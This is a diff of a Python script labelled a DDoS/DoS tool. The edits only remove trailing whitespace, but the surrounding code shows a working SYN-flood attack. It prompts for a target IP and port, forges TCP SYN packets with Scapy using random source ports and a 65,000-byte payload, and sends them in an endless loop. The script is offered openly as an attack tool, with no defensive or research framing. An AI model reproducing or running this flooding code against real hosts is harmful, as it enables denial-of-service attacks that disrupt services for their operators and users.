@@ -16,7 +16,7 @@ import _thread
 
 version = 'v Alpha 0.1'
 
-# Change version in var 
+# Change version in var
 
 title = '''
 
@@ -24,10 +24,10 @@ A DDoS/ DoS script written in Python, the upgraded version of the Batch version.
 
 srforek
 
- __  _ ___ ___ __  _ ___        __  __   __    __  
-|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/ 
-| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`. 
-|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/ 
+ __  _ ___ ___ __  _ ___        __  __   __    __
+|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
+| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
+|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/
 
 
 '''+version+'''
@@ -45,15 +45,15 @@ Discord: editor99#6207
 
 
 
-        '''  
+        '''
 
 
 logoascii = '''
 
- __  _ ___ ___ __  _ ___        __  __   __    __  
-|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/ 
-| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`. 
-|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/ 
+ __  _ ___ ___ __  _ ___        __  __   __    __
+|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
+| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
+|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/
 
 
 
@@ -64,7 +64,7 @@ logoascii = '''
 
 # Function for Main Screen, (mainscr) for easy access.
 
-def mainscr():  
+def mainscr():
 
     os.system("cls")
     print(title)
@@ -81,17 +81,17 @@ os.system("cls")
 sc2 = '''
 
 
-    Enter the destination IP Address:   
-    then, 
-    Enter the port: 
+    Enter the destination IP Address:
+    then,
+    Enter the port:
 
-    ex: xxx.xxx.x.x (Enter) 
+    ex: xxx.xxx.x.x (Enter)
     xx (Enter)
 
 
       (Localhost is the Local IP)
       (Port 80 is the most common ICP, HTTP. )
-    
+
 
        '''
 
@@ -101,12 +101,12 @@ sc2 = '''
 
 # Function for Second Screen, (secondscr) for easy access.
 def secondscr():
-    os.system('cls') 
+    os.system('cls')
 
     print(sc2)
 
     print(logoascii)
-    
+
 
 print(secondscr())
 
@@ -123,7 +123,7 @@ target_port = input("Port:")
 
 
 
-def DoS_synflood():  
+def DoS_synflood():
     # forge IP packet with target ip as the destination IP address
 
     ip = IP(dst=target_ip)
@@ -132,17 +132,15 @@ def DoS_synflood():
     # and the target port as the destination port
 
     tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
-    
+
     # add some flooding data (1kb in this case)
     raw = Raw(b"X"*65000)
 
     # stack up the layers
-    p = ip / tcp / raw 
+    p = ip / tcp / raw
 
-    # send the constructed packet in a loop until CTRL+C is detected 
-    send(p, loop=1)  
-    
-
+    # send the constructed packet in a loop until CTRL+C is detected
+    send(p, loop=1)
 
 
 
@@ -153,7 +151,9 @@ def DoS_synflood():
 
 
 
-os.system('pause')  
+
+
+os.system('pause')
 
 _thread.start_new_thread(DoS_synflood())
 
